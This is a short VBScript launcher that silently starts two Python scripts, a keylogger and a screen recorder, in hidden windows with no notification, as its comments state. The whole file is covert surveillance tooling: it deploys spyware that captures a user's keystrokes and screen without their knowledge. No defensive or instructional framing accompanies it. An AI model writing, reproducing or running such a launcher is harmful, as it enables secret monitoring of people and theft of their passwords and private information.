Set WshShell = CreateObject("WScript.Shell")

' Start KeyLogger silently
WshShell.Run "pythonw KeyLogger.py", 0, False

' Wait 2 seconds
WScript.Sleep 2000

' Start ScreenRecorder silently
WshShell.Run "pythonw ScreenRecoder.py", 0, False

' Completely silent - no notification
